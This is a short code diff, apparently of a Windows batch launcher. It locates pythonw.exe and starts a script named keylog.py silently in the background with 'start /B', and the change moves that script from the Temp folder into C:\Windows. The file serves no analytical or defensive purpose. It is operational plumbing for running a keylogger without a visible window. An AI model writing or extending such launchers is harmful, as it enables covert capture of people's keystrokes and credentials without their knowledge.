@@ -5,5 +5,6 @@ FOR /f "delims=" %%p IN ('where pythonw.exe') DO (
 )
 
 :EXECUTE
-start /B "" "%PYTHON_PATH%" "C:\Windows\Temp\keylog.py"
+start /B "" "%PYTHON_PATH%" "C:\Windows\keylog.py"
+
 
